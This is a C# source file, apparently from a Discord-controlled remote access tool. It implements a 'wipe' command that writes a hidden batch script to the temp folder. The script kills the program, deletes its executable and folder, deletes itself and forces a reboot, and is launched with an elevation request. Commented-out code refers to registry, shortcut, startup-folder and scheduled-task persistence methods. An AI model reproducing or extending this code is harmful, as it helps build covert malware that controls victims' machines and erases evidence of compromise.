using Discord;
using Discord.Commands;
using System.Diagnostics;
using System.Security.Cryptography;
using System.Text;

namespace Main.Source.Bot.Commands
{
    public class Wipe : CommandBase
    {
        public override string Name => "wipe";
        public override string Info => "Uninstalls this";
        public override string Use => "No usage";

        public override async Task Func(SocketCommandContext socket, string[] args)
        {
            string arguments = string.Join(" ", args);
            if (!ConfigMisc.DEBUG_MODE && !Utilities.Parser.GetFlag(arguments, "force"))
            {
                await socket.Message.ReplyAsync($"Cannot run command while not in debug mode without force flag");
                return;
            }

            //switch (ConfigOptions.PERSISTENCE_METHOD)
            //{
            //    case PersistMethod.AutoRunRegKey:
            //        Functions.Persistence.AutoRun.Uninstall();
            //        break;

            //    case PersistMethod.WinLogonRegKey:
            //        Functions.Persistence.WinLogon.Uninstall();
            //        break;

            //    case PersistMethod.ImpersonateLNK:
            //        Functions.Persistence.ImpersonateLNKs.Uninstall();
            //        break;

            //    case PersistMethod.StartFolder:
            //        Functions.Persistence.StartFolder.Uninstall();
            //        break;

            //    case PersistMethod.TaskScheduler:
            //        Functions.Persistence.TaskScheduler.Uninstall();
            //        break;

            //    default:
            //        await socket.Message.ReplyAsync($"Unexpected persistence method: {ConfigOptions.PERSISTENCE_METHOD}");
            //        break;
            //}

            string execPath = Environment.ProcessPath;
            int execPID = Environment.ProcessId;
            var execDir = Directory.GetParent(execPath).FullName;

            var content = new StringBuilder();
            content.AppendLine("ping 1.1.1.1 >nul");
            content.AppendLine("taskkill /f /pid" + execPID + "\" >nul");
            content.AppendLine("del /f /q \"" + execPath + "\" >nul");
            content.AppendLine("rd /s /q \"" + execDir + "\" >nul");
            content.AppendLine("del /f /q \"%~f0\" >nul");
            content.AppendLine("shutdown /r /f /t 0");

            byte[] nameBuffer = new byte[10];
            RandomNumberGenerator.Fill(nameBuffer);

            byte[] hashed = MD5.HashData(nameBuffer);
            string stringed = Convert.ToHexString(hashed).ToUpper();

            string script = Path.Join(Path.GetTempPath(), stringed + ".bat");
            File.WriteAllText(script, content.ToString());

            var msg = await socket.Message.ReplyAsync("Successfully wiped");

            try
            {
                Process.Start(new ProcessStartInfo
                {
                    FileName = script,
                    UseShellExecute = true,
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    Verb = "runas"
                });
            }
            catch (Exception ex)
            {
                Utilities.Logger.Error($"Wipe: [{ex.GetType()}]: {ex.Message} - {ex.StackTrace}");

                await msg.ModifyAsync((msg) =>
                {
                    msg.Content = "Failed to wipe, the exception has been logged";
                });
            }
        }
    }
}
